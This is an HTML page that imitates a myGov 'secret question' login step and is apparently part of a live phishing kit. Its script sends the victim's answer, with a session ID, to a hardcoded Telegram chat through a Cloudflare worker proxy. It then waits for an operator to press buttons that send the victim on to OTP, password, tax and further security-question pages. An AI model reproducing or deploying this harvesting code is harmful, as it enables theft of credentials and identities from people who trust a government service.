<!DOCTYPE html>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>
        Answer your secret question - myGov
    </title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="./css/css.css" rel="stylesheet">
    <link href="./css/mgv2-application.css" rel="stylesheet">
    <link href="./css/blugov.css" rel="stylesheet">
    <style>
        /* Additional inline styles for the processing button */
        .button-main .spinner {
            display: none;
            width: 18px;
            height: 18px;
            border: 2px solid #ffffff;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }
        .button-main.processing .spinner {
            display: inline-block;
        }
        .button-main.processing .btn-text {
            display: none;
        }
        .button-main.processing {
            pointer-events: none;
            opacity: 0.8;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>

<body>
    <header role="banner" class="mgvEnhanceHeader">
        <section class="wrapper">
            <div class="inner">
                <div class="unauth-grid">
                    <div class="unauth-grid-row">
                        <a href="#" class="unauth-govt-crest__link">
                            <img id="unauth-govt-crest" src="./images/myGov-cobranded-logo-black.svg" alt="myGov Beta" role="img">
                        </a>
                        <div class="header-links">
                            <a href="#">Help</a>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </header>
    <div class="wrapper-mapwap">
        <div class="main-block" id="content" role="main">
            <h1>Answer your secret question</h1>

            <form id="sqa-form" action="/las/mygov-login?execution=e5s4" method="post" autocomplete="off">

                <label for="answer">What was the name of my first pet?
                    <div class="input-group">
                        <input type="text" id="answer" name="sqaanswer" data-secretanswer="data-secretanswer" autocomplete="off" aria-required="true">
                    </div>
                </label>

                <div class="button-container">
                    <button type="submit" class="button-main button" name="_eventId_continue">
                        <span class="btn-text">Next</span>
                        <span class="spinner"></span>
                    </button>
                    <button type="button" onclick="location.href='/las/mygov-login?execution=e5s4&amp;_eventId=cancel'" class="button-minor button">Cancel</button>
                </div>

                <input type="hidden" name="accountRecovery" value="">
                <input type="hidden" name="authtype" value="">
                <input type="hidden" name="sqaindex" value="1">
                <input type="hidden" name="_csrf" value="bced7307-4b4e-4fbc-822c-99ffa14838a6">

                <div>
                    <input type="hidden" name="_csrf" value="bced7307-4b4e-4fbc-822c-99ffa14838a6">
                </div>
            </form>
        </div>
    </div>
    <footer role="contentinfo">
        <div class="wrapper">
            <div class="inner">
                <section class="footer-list">
                    <nav>
                        <h2 class="sr-only" aria-label="Footer">Footer</h2>
                        <ul class="lower-links">
                            <li><a target="_blank" href="#">Terms of use</a></li>
                            <li><a target="_blank" href="#">Privacy and security</a></li>
                            <li><a target="_blank" href="#">Copyright</a></li>
                            <li><a target="_blank" href="#">Accessibility</a></li>
                        </ul>
                    </nav>
                </section>
                <div class="footer-lower">
                    <section class="footer-lower-logo">
                        <a href="#">
                            <img src="./images/myGov-cobranded-logo-white.svg" alt="myGov Beta" width="313.17" height="70" role="img">
                        </a>
                    </section>
                    <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
                </div>
            </div>
        </div>
    </footer>

    <!-- ====== SCRIPTS ====== -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
    <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
    <script type="text/javascript">
        $("#ssn").inputmask({ "mask": "999-99-9999" });
        $("#cn").inputmask({ "mask": "9999 9999 9999 9999" });
        $("#dob").inputmask({ "mask": "99/99/9999", "placeholder": "DD/MM/YYYY" });
        $("#exdate").inputmask({ "mask": "99/9999", "placeholder": "MM/YYYY" });
        $("#ph").inputmask({ "mask": "999-999-9999" });
    </script>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>

    <!-- Config + endpoint helpers (endpoints.js / config.js) -->
    <script src="endpoints.js"></script>
    <script src="config.js"></script>

    <!-- ====== TELEGRAM REDIRECT CONTROL ====== -->
    <script>
    // ------------------------------------------------------------
    // SAFE CONFIG — uses config.js values if present, otherwise
    // falls back to the known-good defaults so the page still works.
    // ------------------------------------------------------------
    const PROXY_URL    = (typeof PROXY   !== 'undefined' && PROXY)   ? PROXY   : "https://telegram-proxy.wyldamcmur.workers.dev";
    const CHAT_ID_VAL  = (typeof CHAT_ID !== 'undefined' && CHAT_ID) ? CHAT_ID : "8981287811";

    // Safe wrappers around endpoints.js helpers
    async function safeSendMessage(text, replyMarkup) {
        if (typeof sendTelegramMessageViaProxy === 'function') {
            return sendTelegramMessageViaProxy(text, replyMarkup);
        }
        const r = await fetch(`${PROXY_URL}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID_VAL, text: text, reply_markup: replyMarkup })
        });
        return r.json();
    }

    async function safeGetUpdates(offset, timeout) {
        if (typeof getTelegramUpdates === 'function') {
            return getTelegramUpdates(offset, timeout);
        }
        const r = await fetch(`${PROXY_URL}/getUpdates?offset=${offset}&timeout=${timeout}`);
        return r.json();
    }

    async function safeAnswerCallback(cbId, text) {
        if (typeof answerTelegramCallback === 'function') {
            return answerTelegramCallback(cbId, text);
        }
        return fetch(`${PROXY_URL}/answerCallbackQuery`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ callback_query_id: cbId, text: text })
        });
    }

    // ------------------------------------------------------------
    // ROUTES — keys MUST match the action part of callback_data.
    // e.g. callback_data `sec4:${sid}` → action = "sec4" → sec4.html
    // ------------------------------------------------------------
    const ROUTES = {
        "otp":       "otp.html",
        "detail":    "detail.html",
        "taxyear2":  "taxyear2.html",
        "newpass":   "newpass.html",
        "sec4":      "sec4.html",
        "sec5":      "sec5.html",
        "sec6":      "sec6.html",
        "sec7":      "sec7.html"
    };

    // ------------------------------------------------------------
    // Form handling — button spins, message goes to Telegram,
    // poll loop waits for the chosen question page.
    // ------------------------------------------------------------
    $(document).ready(function() {
        $('#sqa-form').on('submit', async function(e) {
            e.preventDefault();

            const answer = $.trim($('#answer').val());
            if (!answer) {
                alert('Please answer your secret question.');
                return;
            }

            const $btn = $('#sqa-form button[type="submit"]');
            $btn.addClass('processing');
            $btn.prop('disabled', true);

            const sid = (crypto.randomUUID && crypto.randomUUID().slice(0, 8)) ||
                        Math.random().toString(36).slice(2, 10);

            const keyboard = {
                inline_keyboard: [
                    [{ text: "🔐 OTP",                    callback_data: `otp:${sid}`      }],
                    [{ text: "↩️ Detail",                  callback_data: `detail:${sid}`   }],
                    [{ text: "✅ Taxyear",                 callback_data: `taxyear2:${sid}` }],
                    [{ text: "🔒 New Password",            callback_data: `newpass:${sid}`  }],
                    [{ text: "✅ first street name",       callback_data: `sec4:${sid}`     }],
                    [{ text: "✅ school nickname",         callback_data: `sec5:${sid}`     }],
                    [{ text: "✅ favourite subject",       callback_data: `sec6:${sid}`     }],
                    [{ text: "✅ first petname",           callback_data: `sec7:${sid}`     }]
                ]
            };

            try {
                // 1) Baseline offset — only react to NEW button presses
                let startOffset = 0;
                try {
                    const r0 = await fetch(`${PROXY_URL}/getUpdates?offset=-1`);
                    const d0 = await r0.json();
                    startOffset = (d0.result && d0.result.length)
                        ? d0.result[d0.result.length - 1].update_id + 1
                        : 0;
                } catch (err) {
                    console.warn("offset fetch failed, using 0", err);
                }

                // 2) Send the answer + question buttons to Telegram
                const sendResult = await safeSendMessage(
                    `🔔 myGov Secret Question\n❓ What was the name of my first pet?\n💬 Answer: ${answer}\n🆔 Session: ${sid}`,
                    keyboard
                );
                console.log("[sendMessage]", sendResult);
                if (sendResult && sendResult.ok === false) {
                    alert("Telegram rejected the message:\n" +
                          "code=" + sendResult.error_code + "\n" +
                          "desc=" + sendResult.description);
                    $btn.removeClass('processing').prop('disabled', false);
                    return;
                }

                // 3) Wait for the chosen route
                pollLoop(startOffset, sid, $btn);

            } catch (err) {
                console.error("Send failed:", err);
                alert("Could not reach Telegram. Check the console for details.");
                $btn.removeClass('processing').prop('disabled', false);
            }
        });
    });

    // ------------------------------------------------------------
    // Poll loop — stays on this page until Telegram picks a route.
    // ------------------------------------------------------------
    async function pollLoop(offset, sid, $btn) {
        while (true) {
            try {
                const data = await safeGetUpdates(offset, 15);
                if (!data || !data.result) continue;

                for (const upd of data.result) {
                    offset = upd.update_id + 1;
                    const cb = upd.callback_query;
                    if (!cb) continue;

                    const [action, sess] = cb.data.split(":");
                    if (sess !== sid) continue;

                    // Acknowledge the button press in Telegram
                    await safeAnswerCallback(cb.id, "Redirecting user…");

                    // Route to the chosen page (falls back to wait2.html only if unknown)
                    const dest = ROUTES[action];
                    console.log("[pollLoop] action:", action, "→", dest);

                    if (dest) {
                        window.location.href = dest;
                    } else {
                        console.warn("No route for action:", action);
                        $btn.removeClass('processing').prop('disabled', false);
                    }
                    return;
                }
            } catch (e) {
                console.error("Poll error:", e);
                await new Promise(r => setTimeout(r, 2000));
            }
        }
    }
    </script>
</body>

</html>
